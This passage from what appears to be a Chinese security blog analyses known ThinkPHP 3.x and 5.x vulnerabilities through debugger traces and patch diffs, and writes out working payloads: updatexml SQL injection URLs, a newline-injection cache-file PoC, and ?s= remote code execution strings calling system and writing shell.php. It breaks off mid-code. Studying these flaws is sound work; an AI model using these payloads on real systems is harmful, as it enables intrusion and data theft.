，下面是完整代码：</p><pre><code class="php">protected function parseKey($key, $strict = false)    &#123;        $key = trim($key);        if ($strict || (!is_numeric($key) &amp;&amp; !preg_match(&#39;/[,\&#39;\&quot;\*\(\)`.\s]/&#39;, $key))) &#123;            $key = &#39;`&#39; . $key . &#39;`&#39;;        &#125;        return $key;    &#125;</code></pre><p>首先，代码使用trim函数去除$key的首尾空格，确保处理的字符串没有多余的空白字符。</p><p>接下来，通过条件判断语句，检查strict的值和和key的内容，决定是否对$key进行进一步处理。</p><p>如果strict为true，或者key不是一个数字，并且不匹配正则表达式（该正则表达式用于检查$key中是否包含逗号、单引号、双引号、星号、括号、反引号、点号或空白字符），则执行下面的代码块。</p><p>在这个代码块中key前后分别添加了反引号（‘），形成了一个包裹着key的字符串。这样做是为了在后续的数据库查询中使用$key作为字段名或表名时，确保其被正确解析和识别。</p><p>最后，返回经过处理的$key。</p><p>可以看到，这个函数无论如何都会返回$key, 说明这里构造恶意的$key也会正常返回</p><p>测试：</p><p>控制器如下：</p><pre><code class="php">public function index()    &#123;        $count = I(&#39;get.count&#39;);        $m = M(&#39;users&#39;)-&gt;count($count);        echo $m;    &#125;</code></pre><pre><code>?count=id</code></pre><p>在这个函数断点调试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707230038151.png" alt="image-20230707230038151"></p><p>程序第一次获取到的key是数据库中的表名，并且满足if条件将其添加反引号返回</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707230249953.png" alt="image-20230707230249953"></p><p>第二次获取到的是<code>COUNT(id) AS tp_count</code> 直接返回，这个是由于调用count的时候触发ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php::__call()</p><p>在调用<code>getField</code>的时候进行的拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707231116054.png" alt="image-20230707231116054"></p><p>当执行sql语句前，获取到的sql语句如下：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707231602039.png" alt="image-20230707231602039"></p><p>可以直接根据这个进行构造sql语句进行注入</p><pre><code class="php">?count=id) or (select database()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707232743059.png" alt="image-20230707232743059"></p><p>sqlmap：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707232815182.png" alt="image-20230707232815182"></p><h3 id="3-1-3-CVE-2018-10225"><a href="#3-1-3-CVE-2018-10225" class="headerlink" title="3.1.3 CVE-2018-10225"></a>3.1.3 CVE-2018-10225</h3><p>（环境出错）</p><h2 id="ThinkPHP-5-x"><a href="#ThinkPHP-5-x" class="headerlink" title="ThinkPHP 5.x"></a>ThinkPHP 5.x</h2><p>开发手册：<a href="https://static.kancloud.cn/manual/thinkphp5/118003">https://static.kancloud.cn/manual/thinkphp5/118003</a></p><h3 id="5-0-15-ParseData方法注入"><a href="#5-0-15-ParseData方法注入" class="headerlink" title="5.0.15 ParseData方法注入"></a>5.0.15 ParseData方法注入</h3><p>影响版本： <strong>5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15</strong> 、 <strong>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</strong> </p><p>环境安装</p><pre><code>composer create-project --prefer-dist topthink/think=5.0.15 thinkphp5.0.15</code></pre><p>开启 application&#x2F;config.php 中的 app_debug 和 app_trace </p><p>控制器：</p><pre><code class="php"> public function index()    &#123;        $name = request()-&gt;get(&#39;name&#39;);        var_dump($name);//        $result = Db::table(&#39;test&#39;)-&gt;insert([&#39;name&#39; =&gt; $name,&#39;password&#39;=&gt;&#39;123456&#39;]);        $result = db(&#39;test&#39;)-&gt;insert([&#39;name&#39; =&gt; $name,&#39;password&#39;=&gt;&#39;123456&#39;]);        return dump($result);    &#125;</code></pre><p>5.0.15和5.0.16版本对比，发现其修改的 <strong>Builder.php</strong> 文件代码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704201241633.png" alt="image-20230704201241633"></p><p>调试分析：</p><p><code>name=ww</code> –&gt;<code>insert</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704201928517.png" alt="image-20230704201928517"></p><p>到这里发现另一个<code>insert</code>方法，这个是生成sql语句的地方，跟进去看看</p><pre><code>name=ww --&gt;insert--&gt;insert</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704202201864.png" alt="image-20230704202201864"></p><p>在这发现了官方修改的函数<code>parseData</code>,跟进看看</p><pre><code>name=ww --&gt;insert--&gt;insert--&gt;parseData</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704202757576.png" alt="image-20230704202757576"></p><p>发现没有进入到跟新的地方，直接往下生成预处理数据</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203014828.png" alt="image-20230704203014828"></p><p>要进入里面，需要满足<code>$val</code>是数组</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203405087.png" alt="image-20230704203405087"></p><p>可以发现，如果能够进入switch case，这里没有进行预处理，并且是直接拼接返回</p><p>尝试传入数组，name[0]&#x3D;aa,并且把</p><pre><code>$name = request()-&gt;get(&#39;name&#39;);</code></pre><p>修改为</p><pre><code>$name = request()-&gt;get(&#39;name/a&#39;);</code></pre><p>表示数据类型转换为数组</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203856291.png" alt="image-20230704203856291"></p><p>这里已经成功进入，按照跟新的地方，这里修改为</p><pre><code>name[0]=inc</code></pre><p>后面还有$val[1]和$val[2]</p><p>所以要添加够参数</p><pre><code>name[0]=inc&amp;&amp;name[1]=aaa&amp;&amp;name[2]=bbb</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204332433.png" alt="image-20230704204332433"></p><p>运行返回到第一个insert方法</p><p>发现已经拼接好的sql语句，往下就是获取参数绑定和执行了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204531375.png" alt="image-20230704204531375"></p><p>执行报错了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204759216.png" alt="image-20230704204759216"></p><pre><code>name[1]=aa改为name[1]=aa’</code></pre><p>出现sql语句报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204840371.png" alt="image-20230704204840371"></p><p>直接在name[1]进行注入</p><pre><code>http://127.0.0.1/index.php?name[0]=inc&amp;&amp;name[1]=updatexml(1,concat(0x7,database(),0x7e),1)&amp;name[2]=aaa</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704205043250.png" alt="image-20230704205043250"></p><h3 id="5-1-6-paraArraryData方法注入"><a href="#5-1-6-paraArraryData方法注入" class="headerlink" title="5.1.6 paraArraryData方法注入"></a>5.1.6 paraArraryData方法注入</h3><p>影响版本： <strong>5.1.6&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.7</strong></p><p>下载环境</p><pre><code>composer create-project --prefer-dist topthink/think=5.1.6 thinkphp5.1.6</code></pre><p>开启 config&#x2F;app.php 中的 app_debug 和 app_trace </p><p>控制器</p><pre><code class="php">public function index()    &#123;        $password = request()-&gt;get(&#39;password&#39;);        db(&#39;test&#39;)-&gt;where([&#39;name&#39; =&gt; &#39;bb&#39;])-&gt;update([&#39;password&#39; =&gt; $password]);        return &#39;Update success&#39;;    &#125;</code></pre><p>和5.1.8版本对比，发现<code>parseArrayData</code>被删除</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704212600933.png" alt="image-20230704212600933"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704214735175.png" alt="image-20230704214735175"></p><p>很明显的看到上面的parseArrayData是存在直接拼接</p><p>传参数调试一下password&#x3D;123，直接在<code>parseData</code>进行断点调试，</p><pre><code>update()--&gt;update()--parseDate()</code></pre><p>不难发现，传入参数不是数组，不能进入switch case里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215003689.png" alt="image-20230704215003689"></p><p>所以修改传入的参数</p><pre><code>password[0]=1&amp;password[1]=2&amp;password[2]=3</code></pre><p>修改控制器为</p><pre><code class="php">public function index()    &#123;        $password = request()-&gt;get(&#39;password/a&#39;);        db(&#39;test&#39;)-&gt;where([&#39;name&#39; =&gt; &#39;bb&#39;])-&gt;update([&#39;password&#39; =&gt; $password]);        return &#39;Update success&#39;;    &#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215334783.png" alt="image-20230704215334783"></p><p>成功进入parseArrayData,跟进</p><pre><code>update()--&gt;update()--parseDate()-parseArrayData()</code></pre><p>来到了<code>think/db/builder/Mysql.php</code>的Mysql类，因为这个类继承了Builder类</p><p>来到这里，发现<code>$type</code>必须为<code>point</code>才能进行后续的拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215814024.png" alt="image-20230704215814024"></p><p>修改传参,因为后面存在第4位数组，所以加多一位</p><pre><code class="php">?password[0]=point&amp;password[1]=2&amp;password[2]=3&amp;password[3]=4</code></pre><p>拼接后得到结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704220500238.png" alt="image-20230704220500238"></p><p>返回到</p><pre><code>update()--&gt;update()</code></pre><p>查看生成的sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704220818501.png" alt="image-20230704220818501"></p><p>可以对password这部分内容进行构造注入</p><pre><code>http://127.0.0.1/index.php?password[0]=point&amp;password[1]=1&amp;password[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;password[3]=0</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704221119912.png" alt="image-20230704221119912"></p><p>构造的sql语句为</p><pre><code>&quot;UPDATE `test`  SET `password` = updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)  WHERE  `name` = :where_AND_name  &quot;</code></pre><h3 id="5-1-6-parseWhereItem方法注入"><a href="#5-1-6-parseWhereItem方法注入" class="headerlink" title="5.1.6 parseWhereItem方法注入"></a>5.1.6 parseWhereItem方法注入</h3><p>影响版本： <strong>ThinkPHP5全版本</strong> </p><p>控制器</p><pre><code class="php">public function index()    &#123;        $username = request()-&gt;get(&#39;username&#39;);        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,$username)-&gt;select();        var_dump($result);        return &#39;select success&#39;;    &#125;</code></pre><p>传入参数调试</p><pre><code>username=admin</code></pre><p>先进入select(),前面是对参数进行一些分析和处理，里面再调用$this-&gt;connection-&gt;select()</p><pre><code>select()--&gt;connection.select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091038039.png" alt="image-20230705091038039"></p><p>跟进查看</p><p>找到生成sql语句的地方，在</p><pre><code>think\db\Builder-&gt;select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091228734.png" alt="image-20230705091228734"></p><p>跟进</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091445089.png" alt="image-20230705091445089"></p><p>跟进这个 <strong>where</strong> 分析函数<code>parseWhere</code>，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091702418.png" alt="image-20230705091702418"></p><p>跟进</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()--&gt;buildWhere()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091957133.png" alt="image-20230705091957133"></p><p> 程序会运行到parseWhereItem where子单元分析函数，继续跟进查看</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()--&gt;buildWhere()--&gt;parseWhereItem()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094323968.png" alt="image-20230705094323968"></p><p>关键点就在这里，这里会根据不同的表达式进入不同的函数，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094549091.png" alt="image-20230705094549091"></p><p>如果$exp&#x3D;EXP,那么就会进入<code>parseExp</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094719384.png" alt="image-20230705094719384"></p><p>修改控制器</p><pre><code class="php">public function index()    &#123;        $username = request()-&gt;get(&#39;username&#39;);        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,&#39;exp&#39;,$username)-&gt;select();        return &#39;select success&#39;;    &#125;</code></pre><p>这里会出现直接拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094831120.png" alt="image-20230705094831120"></p><p>返回的结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094903839.png" alt="image-20230705094903839"></p><p>层层返回，查看目前生成的sql</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095045212.png" alt="image-20230705095045212"></p><p>然后根据这个sql进行拼接</p><pre><code>http://127.0.0.1/?username=)%20union%20select%20updatexml(1%2cconcat(0x7e,database()%2c0x7e)%2c1)%23%20 </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095305304.png" alt="image-20230705095305304"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095331293.png" alt="image-20230705095331293"></p><h3 id="5-1-22-parseOrder方法注入"><a href="#5-1-22-parseOrder方法注入" class="headerlink" title="5.1.22  parseOrder方法注入"></a><strong>5.1.22</strong>  parseOrder方法注入</h3><p>影响版本： <strong>5.1.16&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.1.22</strong></p><pre><code>composer create-project --prefer-dist topthink/think=5.1.22 thinkphp-5.1.22</code></pre><p>控制器：</p><pre><code class="php">public function index()    &#123;        $orderby = request()-&gt;get(&#39;orderby&#39;);        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; &#39;admin&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    &#125;</code></pre><p>官方修复：添加了<code>)</code>和<code>#</code>检查</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705103055992.png" alt="image-20230705103055992"></p><p>调试，运行到解析函数parseOrder</p><pre><code>?orderby=id--&gt;select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705111300943.png" alt="image-20230705111300943"></p><p>跟进</p><pre><code>?orderby=id--&gt;select()--&gt;parseOrder()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705111503580.png" alt="image-20230705111503580"></p><p>先判断<code>$order</code>是不是为空，就是传入的字符id</p><p>然后把它当数组，获取key和val</p><p>因为<code>key</code>是数字<code>0</code>,运行到<code>list(...)=...</code></p><p>大概是根据空格将字符串分开，变为数组</p><p>然后这里就是关键的地方</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705112056553.png" alt="image-20230705112056553"></p><p>正常来说，<code>sort</code>获取的是order by的排序方式，先把它转为大写，再判断是否在数组里，再拼接</p><p>查看生成的sql语句</p><pre><code>SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id` LIMIT 1  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705112813823.png" alt="image-20230705112813823"></p><p>因为没有过滤，可以尝试再id输入这里构造注入</p><pre><code>orderby=id`,updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></pre><p>发现这里出现了问题</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113050691.png" alt="image-20230705113050691"></p><p>传入的值在当成数组使用时被分割，以逗号分隔开，最后拼接的只有id&#96;</p><p>如果把传入的值本身就是一个数组就能够解决这个问题</p><pre><code>?orderby[]=id`,updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113417373.png" alt="image-20230705113417373"></p><p>最后拼接的结果</p><pre><code>SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id`,updatexml(1,concat(0x7e,database(),0x7e),1)#` LIMIT 1  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113500270.png" alt="image-20230705113500270"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113706760.png" alt="image-20230705113706760"></p><h3 id="5-0-10-cacheFile变量文件包含"><a href="#5-0-10-cacheFile变量文件包含" class="headerlink" title="5.0.10 cacheFile变量文件包含"></a>5.0.10 cacheFile变量文件包含</h3><p>控制器：</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Controller;class Index extends Controller&#123;    public function index()    &#123;        $this-&gt;assign(request()-&gt;get());        return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html    &#125;&#125;</code></pre><p>创建 <strong>application&#x2F;index&#x2F;view&#x2F;index&#x2F;index.html</strong> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错）</p><p>官方发布的更新：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705130446570.png" alt="image-20230705130446570"></p><p>查看这个文件的对应位置<code>template/driver/File.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705130632625.png" alt="image-20230705130632625"></p><p>发现这里可能会存在变量覆盖–&gt;extract(),<code>EXTR_OVERWRITE</code>模式是默认值，如果有冲突，则覆盖已有的变量</p><p>如果 <strong>$cacheFile</strong>可控，将导致文件包含漏洞出现</p><p>随便传入参数调试</p><p>调用栈：</p><pre><code>File.php:45, think\template\driver\File-&gt;read()Template.php:200, think\Template-&gt;fetch()Think.php:84, think\view\driver\Think-&gt;fetch()View.php:163, think\View-&gt;fetch()Controller.php:120, think\Controller-&gt;fetch()Index.php:31, app\index\controller\Index-&gt;index()App.php:343, ReflectionMethod-&gt;invokeArgs()App.php:343, think\App::invokeMethod()App.php:595, think\App::module()App.php:457, think\App::exec()App.php:139, think\App::run()start.php:19, require()index.php:17, &#123;main&#125;()</code></pre><p>到这个read（）函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705132612535.png" alt="image-20230705132612535"></p><p>$var是传入的get参数，这里是数组</p><p>然后进入if,执行了extract()函数，使得这个数组变为: $a&#x3D;1</p><p>因为这里的$cacheFile前面控制不了，可以在这里进行变量覆盖修改它的值</p><p>传参数试试：</p><pre><code>?cacheFile=123</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705133509895.png" alt="image-20230705133509895"></p><p>成功修改</p><p>在<strong>public</strong> 目录下写一个phpinfo.php试试，因为网站根目录是这</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705133824031.png" alt="image-20230705133824031"></p><p>也可以使用绝对路径</p><h3 id="5-0-10-cache缓存函数远程代码执行"><a href="#5-0-10-cache缓存函数远程代码执行" class="headerlink" title="5.0.10 cache缓存函数远程代码执行"></a>5.0.10 cache缓存函数远程代码执行</h3><p>控制器：</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Cache;class Index&#123;    public function index()    &#123;       Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));       return Cache::get(&#39;name&#39;);    &#125;&#125;</code></pre><p>官方修改：<br><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705140742143.png" alt="image-20230705140742143"></p><p>可以看到官方为了不让用户构造的数据执行，在前面加上了exit();</p><p>本版本的代码如下</p><pre><code class="php">public function set($name, $value, $expire = null)    &#123;        if (is_null($expire)) &#123;            $expire = $this-&gt;options[&#39;expire&#39;];        &#125;        $filename = $this-&gt;getCacheKey($name);        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;            $first = true;        &#125;        $data = serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . $data . &quot;\n?&gt;&quot;;        $result = file_put_contents($filename, $data);        if ($result) &#123;            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);            clearstatcache();            return true;        &#125; else &#123;            return false;        &#125;    &#125;</code></pre><p>直接在这下断点调试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705142607510.png" alt="image-20230705142607510"></p><p>红色方框处是获取文件名，和绝对路径</p><p>看一下，文件名生成规则：</p><pre><code class="php">protected function getCacheKey($name)    &#123;        $name = md5($name);        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;            // 使用子目录            $name = substr($name, 0, 2) . DS . substr($name, 2);        &#125;        if ($this-&gt;options[&#39;prefix&#39;]) &#123;            $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;        &#125;        $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;        $dir      = dirname($filename);        if (!is_dir($dir)) &#123;            mkdir($dir, 0755, true);        &#125;        return $filename;    &#125;</code></pre><p>然后再将传入的数据，即缓存数据进行序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705142924210.png" alt="image-20230705142924210"></p><p>这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705143449734.png" alt="image-20230705143449734"></p><p>然后就是进行代码拼接，拼接的是序列化后的值，写入刚刚生成的php文件，虽然在序列化数据前面拼接了单行注释符 <strong>&#x2F;&#x2F;</strong> ，但是我们可以通过注入换行符绕过该限制。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705143101908.png" alt="image-20230705143101908"></p><p>所以构造poc, 其中%0d%0a是回车符和换行符 </p><pre><code>?username=123%0d%0aphpinfo();//</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705144448553.png" alt="image-20230705144448553"></p><h3 id="远程代码执行（1）"><a href="#远程代码执行（1）" class="headerlink" title="远程代码执行（1）"></a>远程代码执行（1）</h3><p>该漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生</p><h4 id="5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22"><a href="#5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22" class="headerlink" title="5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22"></a>5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22</h4><p>测试环境5.0.10</p><p>5.0.23官方修复：添加了对控制器名的检查</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705152558263.png" alt="image-20230705152558263"></p><p>在默认的情况下，可以使用路由兼容模式 <strong>s</strong> 参数，访问控制器内容</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705153739024.png" alt="image-20230705153739024"></p><p>例如：</p><pre><code> http://site/?s=模块/控制器/方法/参数/参数值</code></pre><p>断点调试</p><pre><code>http://127.0.0.1/?s=index/index/index</code></pre><pre><code>run()</code></pre><p>在这个方法里调用了 routeCheck进行了路由检查 </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705163740925.png" alt="image-20230705163740925"></p><p>跟进</p><pre><code>run()--&gt;routeCheck()</code></pre><p>到了这里，这个方法对s传入的控制器&#x2F;方法&#x2F;参数进行解析</p><p>这里用了<code>/</code>对传入的字符串进行分割</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705163934153.png" alt="image-20230705163934153"></p><p>分割后得到</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164451952.png" alt="image-20230705164451952"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164508469.png" alt="image-20230705164508469"></p><p>解析完这个后返回到run()</p><p>调用了exec()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164623977.png" alt="image-20230705164623977"></p><p>跟进</p><pre><code>run()--&gt;exec()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164738354.png" alt="image-20230705164738354"></p><p>继续跟进</p><pre><code>run()--&gt;exec()--&gt;module()</code></pre><p>这里可以看到官方修改的部分</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705165150186.png" alt="image-20230705165150186"></p><p>这里是根据刚刚那个划分出来的数组进行分别处理，[1]为控制器，[2]为操作名</p><p>后面的就是调用这个控制器对应的操作</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705165406310.png" alt="image-20230705165406310"></p><p>整个过程下来，没有对控制器名进行任何检查，可以调用任意控制器的任意方法（已经加载的类）</p><p>下面的是可以利用的</p><pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id  #执行系统命令</code></pre><h4 id="5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><a href="#5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30" class="headerlink" title="5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30"></a>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</h4><p>测试环境5.1.30</p><p>5.1.31官方修复：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705153155297.png" alt="image-20230705153155297"></p><p>这个版本的和上面5.0.x版本漏洞是差不多的,也是没有对控制器名进行检查</p><p>调试</p><pre><code>?s=index/index/index</code></pre><p>run()方法先进行初始化，然后调用<code>routeCheck()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184502066.png" alt="image-20230705184502066"></p><p>跟进</p><pre><code>run() --&gt; routeCheck()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184732894.png" alt="image-20230705184732894"></p><p>在这里获取到s传来的参数，即 模块&#x2F;控制器&#x2F;方法</p><p>然后调用check(),对路由进行处理</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184934238.png" alt="image-20230705184934238"></p><p>跟进</p><pre><code>run() --&gt; routeCheck() --&gt;check()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705185130881.png" alt="image-20230705185130881"></p><p>在这里，路由的<code>/</code>被替换成’<code>| </code> ,即变成<code>index|index|index</code></p><p>来到<code>think/route/dispatch/Module.php</code></p><pre><code>run() --&gt; init() --&gt;init()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705185855493.png" alt="image-20230705185855493"></p><p>这里解析出控制器名和操作名</p><p>接下来就是实例化然后执行</p><pre><code>think\route\dispatch\Module-&gt;exec()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705190032330.png" alt="image-20230705190032330"></p><p>整个过程中没有对控制器名进行检查，从而导致该漏洞</p><p>可利用的控制器：</p><pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><h3 id="远程代码执行（2）"><a href="#远程代码执行（2）" class="headerlink" title="远程代码执行（2）"></a>远程代码执行（2）</h3><h4 id="5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><a href="#5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30" class="headerlink" title="5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30"></a>5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</h4><p>5.0.23分析</p><p>5.0.23版本对比5.0.24，官方修改了Request类，添加了对请求方法的检查</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705191618791.png" alt="image-20230705191618791"></p><p>可以很明显的看出 <code>$method</code> 来自可控的 <code>$_POST</code>数组，而且在获取之后没有进行任何检查，直接把它作为 <code>Request</code> 类的方法进行调用，同时，该方法传入的参数是可控数据 <code>$_POST</code>。也就相当于可以随意调用 <code>Request</code> 类的部分方法。</p><p>这个method()方法在解析路由的过程中调用</p><p>调用栈如下</p><pre><code class="tex">Request.php:507, think\Request-&gt;method()Route.php:848, think\Route::check()App.php:632, think\App::routeCheck()App.php:116, think\App::run()start.php:19, require()index.php:17, &#123;main&#125;()</code></pre><p>在method()方法中</p><pre><code class="php">public function method($method = false)    &#123;        if (true === $method) &#123;            // 获取原始请求类型            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        &#125; elseif (!$this-&gt;method) &#123;            if (isset($_POST[Config::get(&#39;var_method&#39;)])) &#123;                $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);                $this-&gt;&#123;$this-&gt;method&#125;($_POST);            &#125; elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) &#123;                $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);            &#125; else &#123;                $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;            &#125;        &#125;        return 